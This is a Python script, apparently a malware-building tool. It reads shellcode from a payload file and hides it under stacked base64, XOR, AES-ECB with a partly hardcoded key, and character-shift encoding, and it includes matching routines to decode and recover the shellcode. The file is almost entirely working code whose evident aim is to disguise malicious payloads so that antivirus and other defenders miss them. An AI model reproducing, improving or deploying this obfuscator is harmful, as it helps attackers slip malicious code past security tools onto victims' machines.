# -*- coding: utf-8 -*-
"""
@Time ： 2023/1/31 10:43
@Auth ： xinghe
@File ：shellcode_ encry.py
@IDE ：PyCharm
@Motto:执着于理想，纯粹于当下
"""
import base64
import codecs
import math
import time

from Crypto.Cipher import AES


def en_bs64():
    shellcode = open('payload.py')
    shellcode = shellcode.read()
    # 取出shellcode内容
    s1 = shellcode.find("\"") + 1
    s2 = shellcode.rfind("\"")
    shellcode = shellcode[s1:s2]
    shellcode = str(base64.b64encode(shellcode.encode('UTF-8')), 'UTF-8')
    return shellcode


def en_xor(s, key):
    xor_s = ''
    for i in s:
        xor_s += chr(ord(i) ^ key)
    return xor_s


def en_key():
    key = time.strftime("%d", time.localtime())
    if key not in range(0, 25):
        key = 18
    else:
        key = time.strftime("%d", time.localtime())
    return key


def add_to_16(s):
    while len(s) % 16 != 0:
        s += '\0'
    return str.encode(s)  # 返回bytes

def aes_key():
    key = en_key()
    key = str(key) + "LeslieCheungKwol13d"
    return key

def en_aes(text):
    # 密钥长度必须为16、24或32位，分别对应AES-128、AES-192和AES-256
    key = aes_key()
    aes = AES.new(add_to_16(key), AES.MODE_ECB)
    encrypted_text = str(base64.encodebytes(aes.encrypt(add_to_16(text))), encoding='utf8').replace('\n', '')
    return encrypted_text

def encryptMessage(key, message):
    return ''.join([chr(ord(c)+key) for c in message])

def decryptMessage(key, message):
    return ''.join([chr(ord(c)-key) for c in message])

def de_aes(s):
    key = aes_key()
    cipher = AES.new(add_to_16(key), AES.MODE_ECB)
    return cipher.decrypt(base64.decodebytes(bytes(s, encoding='utf8'))).rstrip(b'\0').decode("utf8")


def de_bs64(shellcode):
    shellcode = base64.b64decode(shellcode)
    shellcode = codecs.escape_decode(shellcode)[0]
    return shellcode

def en_all():
    key = en_key()
    en_bs64_text = en_bs64()
    en_xor_text = en_xor(en_bs64_text, key)
    en_aes_text = en_aes(en_xor_text)
    en_wy_text = encryptMessage(key, en_aes_text)
    en_bs64_text = str(base64.b64encode(en_wy_text.encode('UTF-8')), 'UTF-8')
    en_aes_text = en_aes(en_bs64_text)
    return en_aes_text

def de_all(text):
    key = en_key()
    de_aes_text = de_aes(text)
    de_bs64_text = str(base64.b64decode(de_aes_text.encode('UTF-8')), 'UTF-8')
    de_wy_text = decryptMessage(key,de_bs64_text)
    de_aes_text = de_aes(de_wy_text)
    de_xor_text = en_xor(de_aes_text,key)
    de_bs64_text = de_bs64(de_xor_text)
    return de_bs64_text

if __name__ == '__main__':
    print(en_all())
    #print(de_all(en_all()))

